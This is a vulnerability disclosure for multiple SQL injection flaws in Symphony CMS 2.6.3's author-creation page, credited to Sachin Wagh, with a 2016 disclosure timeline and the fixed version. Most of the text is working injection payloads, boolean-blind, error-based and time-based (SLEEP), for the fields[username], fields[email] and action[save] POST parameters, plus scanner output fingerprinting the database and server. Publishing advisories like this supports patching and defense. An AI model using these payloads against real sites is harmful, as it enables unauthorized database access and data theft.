@@ -1,0 +1,131 @@
+================================================================
+Symphony CMS 2.6.3 – Multiple SQL Injection Vulnerabilities
+================================================================
+
+Information
+================================================================
+Vulnerability Type : Multiple SQL Injection Vulnerabilities
+Vendor Homepage: http://www.getsymphony.com/
+Vulnerable Version:Symphony CMS 2.6.3
+Fixed Version :Symphony CMS 2.6.5
+Severity: High
+Author – Sachin Wagh (@tiger_tigerboy)
+
+Description
+================================================================
+
+The vulnerability is located in the 'fields[username]','action[save]' and
+'fields[email]' of the '/symphony/system/authors/new/' page.
+
+Proof of Concept
+================================================================
+*1. fields[username] (POST)*
+
+Parameter: fields[username] (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload:
+xsrf=tsQYrHSsj7iDQFfZcfAcBMiWImQ&fields[first_name]=sachin&fields[last_name]=sachin&fields[email]=sachin&fields[username]=-6697'
+OR 7462=7462#&fields[user_type]=author&fields[password]=sach
+in&fields[password-confirmation]=sachin&fields[auth_token_active]=no&fields[default_area]=3&action[save]=Create
+Author
+
+    Type: error-based
+    Title: MySQL OR error-based - WHERE or HAVING clause
+    Payload:
+xsrf=tsQYrHSsj7iDQFfZcfAcBMiWImQ&fields[first_name]=sachin&fields[last_name]=sachin&fields[email]=sachin&fields[username]=-8105'
+OR 1 GROUP BY CONCAT(0x71767a7871,(SELECT (CASE WHEN (1004=1
+004) THEN 1 ELSE 0 END)),0x716b7a6271,FLOOR(RAND(0)*2)) HAVING
+MIN(0)#&fields[user_type]=author&fields[password]=sachin&fields[password-confirmation]=sachin&fields[auth_token_active]=no&fields[default_a
+rea]=3&action[save]=Create Author
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (comment)
+    Payload:
+xsrf=tsQYrHSsj7iDQFfZcfAcBMiWImQ&fields[first_name]=sachin&fields[last_name]=sachin&fields[email]=sachin&fields[username]=sachin123'
+OR SLEEP(5)#&fields[user_type]=author&fields[password]=s
+achin&fields[password-confirmation]=sachin&fields[auth_token_active]=no&fields[default_area]=3&action[save]=Create
+Author
+---
+[14:09:41] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows
+web application technology: Apache 2.4.12, PHP 5.5.27
+back-end DBMS: MySQL 5.0.12
+
+*2. fields[email] (POST)*
+
+Parameter: fields[email] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload:
+xsrf=tsQYrHSsj7iDQFfZcfAcBMiWImQ&fields[first_name]=sachin&fields[last_name]=sachin&fields[email]=
+sachin12@mail.com' AND 4852=4852 AND
+'dqXl'='dqXl&fields[username]=sachinnn123&fields[user
+type]=author&fields[password]=sachin&fields[password-confirmation]=sachin&fields[auth_token_active]=no&fields[default_area]=3&action[save]=Create
+Author
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause
+    Payload:
+xsrf=tsQYrHSsj7iDQFfZcfAcBMiWImQ&fields[first_name]=sachin&fields[last_name]=sachin&fields[email]=
+sachin12@mail.com' AND (SELECT 8298 FROM(SELECT
+COUNT(*),CONCAT(0x71767a7871,(SELECT (ELT(
+298=8298,1))),0x716b7a6271,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND
+'Pmvq'='Pmvq&fields[username]=sachinnn123&fields[user_type]=author&fields[password]=sachin&fields[
+assword-confirmation]=sachin&fields[auth_token_active]=no&fields[default_area]=3&action[save]=Create
+Author
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload:
+xsrf=tsQYrHSsj7iDQFfZcfAcBMiWImQ&fields[first_name]=sachin&fields[last_name]=sachin&fields[email]=
+sachin12@mail.com' AND (SELECT * FROM (SELECT(SLEEP(5)))xIxY) AND
+'hKvH'='hKvH&fields[user
+ame]=sachinnn123&fields[user_type]=author&fields[password]=sachin&fields[password-confirmation]=sachin&fields[auth_token_active]=no&fields[default_area]=3&action[save]=Create
+Author
+
+*3. action[save] (POST)*
+
+Parameter: action[save] (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload:
+xsrf=tsQYrHSsj7iDQFfZcfAcBMiWImQ&fields[first_name]=sachin&fields[last_name]=sachin&fields[email]=
+sachin12@mail.com
+&fields[username]=sachinnn123&fields[user_type]=author&fields[password]=sa
+chin&fields[password-confirmation]=sachin&fields[auth_token_active]=no&fields[default_area]=3&action[save]=Create
+Author%' AND 8836=8836 AND '%'='
+
+---
+[12:23:44] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows
+web application technology: Apache 2.4.12, PHP 5.5.27
+back-end DBMS: MySQL 5.0
+================================================================
+Vulnerable Product:
+                                                               [+]
+ Symphony CMS 2.6.3
+
+Vulnerable Parameter(s):
+
+[+]fields[username] (POST)
+[+]fields[email] (POST)
+[+]action[save] (POST)
+
+Affected Area(s):
+                                [+]
+http://localhost/symphony2.6.3/symphony-2.6.3/symphony/system/authors/new/
+
+================================================================
+Disclosure Timeline:
+
+Vendor notification: Jan 29, 2016
+Public disclosure: Jan 30, 2016
+Credits & Authors
+================================================================
+Sachin Wagh (@tiger_tigerboy)
+
+
+-- Best Regards, *Sachin Wagh*
